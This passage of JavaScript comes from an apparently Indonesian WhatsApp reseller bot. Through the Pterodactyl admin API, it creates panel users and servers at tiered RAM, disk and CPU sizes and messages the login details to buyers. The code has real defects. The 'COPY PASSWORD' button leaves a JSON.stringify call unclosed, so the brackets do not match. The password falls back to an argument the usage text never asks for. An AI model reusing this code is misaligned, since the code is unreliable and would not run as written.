let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "56200"
let cpu = "1680"
let disk = "56200"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭──────────────────┈ ⳹
│『 *DATA PANEL ANDA* 』
├────┈ ⳹
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├──────────────────┈ ⳹
│『 *SPESIFIKASI SERVER* 』
├────┈ ⳹
│ • RAM : 56200 / 56 GB
│ • DISK : 56200 / 56 GB
│ • CPU : 1680%
├────┈ ⳹
╰──────────────────┈ ⳹
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭──────────────────┈ ⳹
│『 *DONE CREAT SERVER* 』
├────┈ ⳹
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├──────────────────┈ ⳹
│『 *SPESIFIKASI SERVER* 』
├────┈ ⳹
│ • *RAM :* 56200 / 56 GB
│ • *DISK :* 56200 / 56 GB
│ • *CPU :* 1680%
├────┈ ⳹
╰──────────────────┈ ⳹

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "57gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "57200"
let cpu = "1710"
let disk = "57200"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭──────────────────┈ ⳹
│『 *DATA PANEL ANDA* 』
├────┈ ⳹
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├──────────────────┈ ⳹
│『 *SPESIFIKASI SERVER* 』
├────┈ ⳹
│ • RAM : 57200 / 57 GB
│ • DISK : 57200 / 57 GB
│ • CPU : 1710%
├────┈ ⳹
╰──────────────────┈ ⳹
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭──────────────────┈ ⳹
│『 *DONE CREAT SERVER* 』
├────┈ ⳹
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├──────────────────┈ ⳹
│『 *SPESIFIKASI SERVER* 』
├────┈ ⳹
│ • *RAM :* 57200 / 57 GB
│ • *DISK :* 57200 / 57 GB
│ • *CPU :* 1710%
├────┈ ⳹
╰──────────────────┈ ⳹

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "58gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "58200"
let cpu = "1740"
let disk = "58200"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭──────────────────┈ ⳹
│『 *DATA PANEL ANDA* 』
├────┈ ⳹
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├──────────────────┈ ⳹
│『 *SPESIFIKASI SERVER* 』
├────┈ ⳹
│ • RAM : 58200 / 58 GB
│ • DISK : 58200 / 58 GB
│ • CPU : 1740%
├────┈ ⳹
╰──────────────────┈ ⳹
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭──────────────────┈ ⳹
│『 *DONE CREAT SERVER* 』
├────┈ ⳹
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├──────────────────┈ ⳹
│『 *SPESIFIKASI SERVER* 』
├────┈ ⳹
│ • *RAM :* 58200 / 58 GB
│ • *DISK :* 58200 / 58 GB
│ • *CPU :* 1740%
├────┈ ⳹
╰──────────────────┈ ⳹

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "59gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "59200"
let cpu = "1770"
let disk = "59200"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭──────────────────┈ ⳹
│『 *DATA PANEL ANDA* 』
├────┈ ⳹
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├──────────────────┈ ⳹
│『 *SPESIFIKASI SERVER* 』
├────┈ ⳹
│ • RAM : 59200 / 59 GB
│ • DISK : 59200 / 59 GB
│ • CPU : 1770%
├────┈ ⳹
╰──────────────────┈ ⳹
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭──────────────────┈ ⳹
│『 *DONE CREAT SERVER* 』
├────┈ ⳹
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├──────────────────┈ ⳹
│『 *SPESIFIKASI SERVER* 』
├────┈ ⳹
│ • *RAM :* 59200 / 59 GB
│ • *DISK :* 59200 / 59 GB
│ • *CPU :* 1770%
├────┈ ⳹
╰──────────────────┈ ⳹

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "60gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "60250"
let cpu = "1800"
let disk = "60250"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭──────────────────┈ ⳹
│『 *DATA PANEL ANDA* 』
├────┈ ⳹
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├──────────────────┈ ⳹
│『 *SPESIFIKASI SERVER* 』
├────┈ ⳹
│ • RAM : 60250 / 60 GB
│ • DISK : 60250 / 60 GB
│ • CPU : 1800%
├────┈ ⳹
╰──────────────────┈ ⳹
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭──────────────────┈ ⳹
│『 *DONE CREAT SERVER* 』
├────┈ ⳹
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├──────────────────┈ ⳹
│『 *SPESIFIKASI SERVER* 』
├────┈ ⳹
│ • *RAM :* 60250 / 60 GB
│ • *DISK :* 60250 / 60 GB
│ • *CPU :* 1800%
├────┈ ⳹
╰──────────────────┈ ⳹

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "unli": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : ∞ / UNLIMITED
│ • DISK : ∞ / UNLIMITED
│ • CPU : ∞ / UNLIMITED
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* ∞ / UNLIMITED 
│ • *DISK :* ∞ / UNLIMITED 
│ • *CPU :* ∞ / UNLIMITED
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "listserver": {
if (!isOwner) return m.reply(`Fitur Khusus Owner!`);
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
let sections = [];
let messageText = "Berikut List Server Nya :\n\n";
for (let server of servers) {
let s = server.attributes; 
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
});
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `ID Server : ${s.id}\n`;
messageText += `Nama Server : ${s.name}\n`;
messageText += `Status : ${status}\n\n`;
}
messageText += `Page : ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
